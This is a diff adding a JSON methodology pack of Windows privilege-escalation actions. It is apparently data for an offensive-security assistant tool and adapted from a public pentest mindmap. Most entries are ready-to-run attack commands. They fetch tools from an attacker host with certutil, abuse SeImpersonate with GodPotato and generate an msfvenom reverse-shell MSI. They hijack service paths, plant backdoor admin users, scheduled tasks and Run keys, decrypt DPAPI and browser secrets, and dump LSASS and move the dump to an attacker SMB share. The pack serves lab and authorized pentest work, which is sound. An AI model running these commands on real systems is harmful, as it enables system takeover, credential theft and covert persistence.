@@ -1,0 +1,508 @@
+{
+ "id": "orange_windows_privesc_2025_03",
+ "title": "Windows Privilege Escalation (Orange Cyberdefense 2025.03)",
+ "source": "Orange Cyberdefense ocd-mindmaps windows-privesc 2025.03",
+ "upstream_commit": "6d16ca0d1434875e0617f2f3cfa825fad0bc7d7e",
+ "license": "GPL-3.0 (methodology data); see obol/packs/NOTICE.md",
+ "actions": [
+  {
+   "id": "windows-enum",
+   "title": "Local Enumeration Sweep",
+   "hypothesis": "Same doctrine as Linux: breadth from a scanner (winpeas), judgment from you. The lab classics are service misconfigurations, stored credentials, unquoted paths, and token privileges. Run the scanner, then verify the specific lead manually before staging anything.",
+   "tool": "winpeas",
+   "tools": [
+    "winpeas"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "foothold.windows"
+   ],
+   "produces": [
+    "privesc.leads",
+    "host.kernel",
+    "host.arch"
+   ],
+   "priority": 94,
+   "proves": "establishes local privilege escalation leads, host kernel/version, host architecture",
+   "does_not_prove": "local privilege escalation lead only — not admin/root/SYSTEM until separately proven",
+   "report": {
+    "finding": "Local Privilege Escalation Vector",
+    "severity": "high"
+   },
+   "refs": [
+    "https://github.com/peass-ng/PEASS-ng",
+    "https://lolbas-project.github.io/"
+   ],
+   "commands": [
+    {
+     "tool": "winpeas",
+     "run": "certutil -urlcache -f http://{{lhost}}:8000/winPEASx64.exe wp.exe && wp.exe",
+     "note": "Serve from your box. cmd variant; use iwr in PowerShell sessions."
+    },
+    {
+     "tool": "sh",
+     "run": "whoami /all && systeminfo && net localgroup administrators",
+     "note": "Identity, patches (for kernel-CVE triage), and who already holds admin."
+    },
+    {
+     "tool": "sh",
+     "run": "cmdkey /list && reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
+     "note": "Stored creds and autologon — free passwords more often than you would think."
+    }
+   ]
+  },
+  {
+   "id": "seimpersonate",
+   "title": "SeImpersonatePrivilege (Potato Family)",
+   "hypothesis": "Service accounts (IIS, MSSQL) almost always hold SeImpersonatePrivilege, which lets them capture a SYSTEM authentication and impersonate it — the entire potato family (GodPotato on modern Windows, PrintSpoofer, JuicyPotato on older). Prerequisite check first: SeImpersonate present, .NET version adequate, x64, writable staging directory.",
+   "tool": "godpotato",
+   "tools": [
+    "godpotato"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "privesc.windows_privilege"
+   ],
+   "produces": [
+    "access.system"
+   ],
+   "priority": 80,
+   "proves": "establishes SYSTEM access",
+   "does_not_prove": "SYSTEM only when command output proves it; a privilege or service lead alone is not SYSTEM",
+   "report": {
+    "finding": "SeImpersonatePrivilege Abuse (Potato)",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://github.com/BeichenDream/GodPotato",
+    "https://lolbas-project.github.io/"
+   ],
+   "commands": [
+    {
+     "tool": "sh",
+     "run": "whoami /priv | findstr /i impersonate",
+     "note": "Confirm SeImpersonatePrivilege before anything else."
+    },
+    {
+     "tool": "sh",
+     "run": "certutil -urlcache -f http://{{lhost}}:8000/GodPotato-NET4.exe gp.exe",
+     "note": "Stage the binary you chose (served from your box). GodPotato covers Win10/11/Server 2012+; older targets want JuicyPotato."
+    },
+    {
+     "tool": "sh",
+     "run": "gp.exe -cmd \"cmd /c whoami > C:\\Windows\\Temp\\proof.txt\"",
+     "note": "Prove SYSTEM first with a benign write, read it back, then run your real payload/reverse command."
+    }
+   ]
+  },
+  {
+   "id": "unquoted-service-path",
+   "title": "Unquoted Service Path",
+   "hypothesis": "A service binary path with spaces and no quotes (C:\\Program Files\\My App\\svc.exe) makes Windows try C:\\Program.exe, then C:\\Program Files\\My.exe, in order. If any directory in the chain is writable by you, drop an executable with the right name and restart the service (or wait for reboot).",
+   "tool": "wmic",
+   "tools": [
+    "wmic",
+    "icacls"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "privesc.unquoted_service_path"
+   ],
+   "produces": [
+    "access.system"
+   ],
+   "priority": 76,
+   "proves": "establishes SYSTEM access",
+   "does_not_prove": "SYSTEM only when command output proves it; a privilege or service lead alone is not SYSTEM",
+   "report": {
+    "finding": "Unquoted Service Path",
+    "severity": "high"
+   },
+   "refs": [
+    "https://lolbas-project.github.io/"
+   ],
+   "commands": [
+    {
+     "tool": "sh",
+     "run": "wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v '\"'",
+     "note": "Find auto-start services with unquoted paths outside C:\\Windows."
+    },
+    {
+     "tool": "sh",
+     "run": "icacls \"C:\\Program Files\\My App\"",
+     "note": "Verify you can write into the vulnerable directory before staging anything."
+    }
+   ]
+  },
+  {
+   "id": "weak-service-permissions",
+   "title": "Weak Service Permissions / Binary Replacement",
+   "hypothesis": "If you can modify a service configuration (SERVICE_CHANGE_CONFIG) or write to the binary it runs, you control what runs as SYSTEM on next start. accesschk finds them; then point binpath at your command or replace the binary.",
+   "tool": "accesschk",
+   "tools": [
+    "accesschk",
+    "sc"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "privesc.weak_service_permission"
+   ],
+   "produces": [
+    "access.system"
+   ],
+   "priority": 76,
+   "proves": "establishes SYSTEM access",
+   "does_not_prove": "SYSTEM only when command output proves it; a privilege or service lead alone is not SYSTEM",
+   "report": {
+    "finding": "Weak Service Permissions",
+    "severity": "high"
+   },
+   "refs": [
+    "https://lolbas-project.github.io/"
+   ],
+   "commands": [
+    {
+     "tool": "accesschk",
+     "run": "accesschk.exe -uwcqv {{user}} * /accepteula",
+     "note": "Services your account can reconfigure."
+    },
+    {
+     "tool": "sh",
+     "run": "sc config {{service}} binpath= \"net localgroup administrators {{user}} /add\"",
+     "note": "Point the service at a benign-but-decisive command, then: sc stop/start (or wait for reboot if you lack stop rights)."
+    },
+    {
+     "tool": "sh",
+     "run": "icacls \"C:\\path\\to\\service.exe\"",
+     "note": "Alternate: if the binary itself is writable, back it up and replace it with your payload."
+    }
+   ]
+  },
+  {
+   "id": "alwaysinstallelevated",
+   "title": "AlwaysInstallElevated",
+   "hypothesis": "If both HKLM and HKCU AlwaysInstallElevated are set to 1, any MSI you run installs as SYSTEM. Generate an MSI that adds an admin user or runs a command, install it, done.",
+   "tool": "msfvenom",
+   "tools": [
+    "msfvenom",
+    "msiexec"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "privesc.always_install_elevated"
+   ],
+   "produces": [
+    "access.system"
+   ],
+   "priority": 78,
+   "proves": "establishes SYSTEM access",
+   "does_not_prove": "SYSTEM only when command output proves it; a privilege or service lead alone is not SYSTEM",
+   "report": {
+    "finding": "AlwaysInstallElevated Enabled",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://lolbas-project.github.io/lolbas/Binaries/Msiexec/"
+   ],
+   "commands": [
+    {
+     "tool": "sh",
+     "run": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+     "note": "BOTH must be 1. One without the other is nothing."
+    },
+    {
+     "tool": "msfvenom",
+     "run": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f msi -o setup.msi",
+     "note": "Generate locally (the mentor can build this for you), upload, run: msiexec /i setup.msi /quiet"
+    }
+   ]
+  },
+  {
+   "id": "dpapi-secrets",
+   "title": "DPAPI Credential Decryption",
+   "hypothesis": "Windows stores saved credentials (RDP, scheduled tasks, browsers) encrypted with DPAPI masterkeys, which are themselves wrapped with the user's password hash. On boxes where you have a user's password (or are SYSTEM), the entire credential store decrypts — a reliable path to lateral credentials in the 0xdf corpus.",
+   "tool": "impacket-dpapi",
+   "tools": [
+    "impacket-dpapi",
+    "mimikatz"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [
+    "foothold.windows"
+   ],
+   "requires_any": [
+    "credential.available",
+    "access.system"
+   ],
+   "produces": [
+    "credential.plaintext",
+    "credential.candidate"
+   ],
+   "priority": 66,
+   "proves": "establishes a plaintext password, candidate credentials",
+   "does_not_prove": "credential material only — not access until it authenticates against a service",
+   "report": {
+    "finding": "Stored Credentials Recovered via DPAPI",
+    "severity": "high"
+   },
+   "refs": [
+    "https://www.thehacker.recipes/ad/movement/dpapi",
+    "https://lolbas-project.github.io/"
+   ],
+   "commands": [
+    {
+     "tool": "sh",
+     "run": "dir /a %APPDATA%\\Microsoft\\Credentials && dir /a %APPDATA%\\Microsoft\\Protect",
+     "note": "Find credential blobs and their masterkey GUIDs. Each blob names its masterkey in the file contents."
+    },
+    {
+     "tool": "impacket-dpapi",
+     "run": "impacket-dpapi masterkey -file <masterkey-file> -sid <user-sid> -password '{{password}}'",
+     "note": "Unwrap the masterkey using the user's password. mimikatz dpapi::masterkey is the on-box equivalent."
+    },
+    {
+     "tool": "impacket-dpapi",
+     "run": "impacket-dpapi credential -file <credential-blob> -key <unwrapped-masterkey-hex>",
+     "note": "Decrypt the blob with the unwrapped key. RDP creds, VPN creds, service passwords all surface here."
+    },
+    {
+     "tool": "mimikatz",
+     "run": "mimikatz # dpapi::cred /in:C:\\Users\\{{user}}\\AppData\\Roaming\\Microsoft\\Credentials\\<blob>",
+     "note": "On-box variant when you are running as that user or SYSTEM."
+    }
+   ]
+  },
+  {
+   "id": "stored-credentials",
+   "title": "Stored Credential Hunting (Windows)",
+   "hypothesis": "Windows is a credential hoard: Credential Manager (cmdkey), autologon registry keys, unattend/sysprep answer files, saved RDP files, browser stores, and remote-connection managers (mRemoteNG config with decryptable passwords) all leak reusable creds. On lab boxes this sweep is short, scripted, and pays out constantly.",
+   "tool": "sh",
+   "tools": [
+    "sh"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "foothold.windows"
+   ],
+   "produces": [
+    "credential.candidate",
+    "credential.plaintext",
+    "privesc.stored_credentials"
+   ],
+   "priority": 82,
+   "proves": "establishes candidate credentials, a plaintext password, stored Windows credential lead",
+   "does_not_prove": "local privilege escalation lead only — not admin/root/SYSTEM until separately proven",
+   "report": {
+    "finding": "Stored Credentials in Cleartext/Recoverable Form",
+    "severity": "high"
+   },
+   "refs": [
+    "https://lolbas-project.github.io/"
+   ],
+   "commands": [
+    {
+     "tool": "sh",
+     "run": "cmdkey /list",
+     "note": "Saved credentials. If one exists: runas /savecred /user:{{user}} cmd.exe to use it without knowing the password."
+    },
+    {
+     "tool": "sh",
+     "run": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
+     "note": "Autologon: DefaultUserName / DefaultPassword in cleartext."
+    },
+    {
+     "tool": "sh",
+     "run": "dir /s C:\\unattend.xml C:\\sysprep.inf C:\\sysprep\\sysprep.xml 2>nul",
+     "note": "Answer files from imaging — local admin passwords in cleartext. Also check C:\\Windows\\Panther\\Unattend.xml."
+    },
+    {
+     "tool": "sh",
+     "run": "dir /s %APPDATA%\\..\\*mRemoteNG*confCons.xml 2>nul && dir %USERPROFILE%\\*.rdp",
+     "note": "mRemoteNG configs hold encrypted-but-decryptable passwords (static key); .rdp files point at targets and usernames."
+    },
+    {
+     "tool": "sh",
+     "run": "dir %APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login* 2>nul",
+     "note": "Browser stores: DPAPI-protected — decrypt via SharpChrome or by copying Login Data + the Local State key offline."
+    }
+   ]
+  },
+  {
+   "id": "wesng-patch-gaps",
+   "title": "Missing-Patch Exploit Suggestions (wesng)",
+   "hypothesis": "Old Windows boxes (especially HTB-era 2008/2012/7) are often privesc'd by a missing patch, not a misconfiguration. systeminfo output feeds Windows Exploit Suggester / wesng, which maps missing hotfixes to public exploits (MS16-032, MS15-051, Chimichurri...). This is the arctic/grandpa pattern: enumerate patches, match, exploit.",
+   "tool": "wesng",
+   "tools": [
+    "wesng"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "foothold.windows"
+   ],
+   "produces": [
+    "exploit.candidate",
+    "privesc.patch_gap"
+   ],
+   "priority": 70,
+   "proves": "establishes a candidate exploit, missing-patch privesc lead",
+   "does_not_prove": "local privilege escalation lead only — not admin/root/SYSTEM until separately proven",
+   "report": {
+    "finding": "Missing Security Patches with Public Exploits",
+    "severity": "high"
+   },
+   "refs": [
+    "https://github.com/bitsadmin/wesng"
+   ],
+   "commands": [
+    {
+     "tool": "sh",
+     "run": "systeminfo",
+     "note": "On the target. Save the full output locally: systeminfo > sysinfo.txt then transfer it back."
+    },
+    {
+     "tool": "sh",
+     "run": "wesng sysinfo.txt",
+     "note": "On your box (pip install wesng; it auto-updates its database). Lists missing KBs mapped to public exploits, ranked."
+    },
+    {
+     "tool": "sh",
+     "run": "python3 windows-exploit-suggester.py --update && python3 windows-exploit-suggester.py --database mssb.xls --systeminfo sysinfo.txt",
+     "note": "The classic alternative (corpus arctic). Older but battle-tested on 2008-era boxes."
+    }
+   ]
+  },
+  {
+   "id": "windows-persistence",
+   "title": "Windows Persistence (Post-Admin)",
+   "hypothesis": "After admin/SYSTEM, leave a way back: a local admin user you control, a scheduled task, or a Run key. Labs rarely require it, but long engagements do — and it is a report-worthy finding about detection gaps. Document and remove everything you plant.",
+   "tool": "sh",
+   "tools": [
+    "sh"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "access.admin",
+    "access.system"
+   ],
+   "produces": [
+    "persistence.windows"
+   ],
+   "priority": 50,
+   "proves": "establishes Windows persistence",
+   "does_not_prove": "persistence setup context — document and clean up; not a new privilege level",
+   "report": {
+    "finding": "Persistence Mechanism Planted",
+    "severity": "informational"
+   },
+   "refs": [
+    "https://lolbas-project.github.io/"
+   ],
+   "commands": [
+    {
+     "tool": "sh",
+     "run": "net user obol_supp 'Str0ng!Passw0rd' /add && net localgroup administrators obol_supp /add",
+     "note": "Classic local-admin backdoor. Obvious in any user audit — fine for labs, loud in real environments."
+    },
+    {
+     "tool": "sh",
+     "run": "schtasks /create /tn \"WindowsUpdateCheck\" /sc daily /st 09:00 /tr \"C:\\Windows\\Temp\\update.exe\" /ru SYSTEM",
+     "note": "Scheduled task running your binary as SYSTEM daily."
+    },
+    {
+     "tool": "sh",
+     "run": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Windows\\Temp\\update.exe\"",
+     "note": "Run key — fires at next logon."
+    }
+   ]
+  },
+  {
+   "id": "lsass-dump-onbox",
+   "title": "On-Box LSASS Memory Dump",
+   "hypothesis": "LSASS holds the credentials of every logged-on user in memory. As admin/SYSTEM you can dump its process with built-in comsvcs.dll (no tools uploaded) or procdump, exfiltrate the .dmp, and parse it offline with pypykatz — plaintext passwords, NT hashes, and Kerberos tickets of anyone logged in. This is the reliable complement to remote secrets dumping when you only have a shell on the box.",
+   "tool": "cmd",
+   "tools": [
+    "cmd",
+    "procdump",
+    "pypykatz",
+    "impacket-smbserver"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "access.admin",
+    "access.system"
+   ],
+   "produces": [
+    "credential.plaintext",
+    "hash.ntlm",
+    "kerberos.tickets"
+   ],
+   "priority": 66,
+   "proves": "establishes a plaintext password, NTLM hashes, Kerberos tickets",
+   "does_not_prove": "credential material only — not access until it authenticates against a service",
+   "report": {
+    "finding": "Credentials Extractable from LSASS Memory",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/",
+    "https://github.com/skelsec/pypykatz"
+   ],
+   "commands": [
+    {
+     "tool": "powershell",
+     "run": "Get-Process lsass",
+     "note": "Get the LSASS PID first — comsvcs MiniDump needs it. tasklist /svc also shows it."
+    },
+    {
+     "tool": "cmd",
+     "run": "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\lsass.dmp full",
+     "note": "Built-in LOLBin dump — replace 672 with the actual PID, run from an elevated prompt. Nothing uploaded; comsvcs.dll MiniDump is a documented Windows feature. (Defender watches this exact string on modern boxes; procdump is the fallback.)"
+    },
+    {
+     "tool": "sh",
+     "run": "procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp",
+     "note": "Sysinternals alternative when comsvcs is blocked. Serve procdump from your box (see file-transfer)."
+    },
+    {
+     "tool": "impacket-smbserver",
+     "run": "impacket-smbserver -smb2support CompData .",
+     "note": "On YOUR box: receive the dump. From the target: move C:\\Windows\\Temp\\lsass.dmp \\\\{{lhost}}\\CompData"
+    },
+    {
+     "tool": "pypykatz",
+     "run": "pypykatz lsa minidump lsass.dmp",
+     "note": "Parse offline on your box. Logonpasswords, NT hashes, and Kerberos tickets for every session captured — spray nothing, reuse everything. mimikatz sekurlsa::minidump + sekurlsa::logonpasswords is the Windows-parse variant."
+    }
+   ]
+  }
+ ]
+}
